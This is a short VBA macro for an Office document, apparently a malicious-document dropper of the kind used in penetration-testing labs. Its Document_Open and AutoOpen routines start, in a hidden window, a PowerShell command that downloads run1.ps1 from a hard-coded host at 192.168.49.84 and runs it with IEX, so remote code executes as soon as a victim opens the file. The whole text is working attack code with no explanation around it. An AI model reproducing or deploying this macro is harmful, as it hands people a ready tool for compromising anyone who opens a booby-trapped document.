Sub DownExec()
    Dim str as String
    str = "powershell $wc=New-Object Net.WebClient;$wc.Proxy=[Net.GlobalProxySelection]::GetEmptyWebProxy();IEX $wc.DownloadString('http://192.168.49.84/run1.ps1');"
    Shell str, vbHide
End Sub

Sub Document_Open()
    DownExec
End Sub

Sub AutoOpen()
    DownExec
End Sub
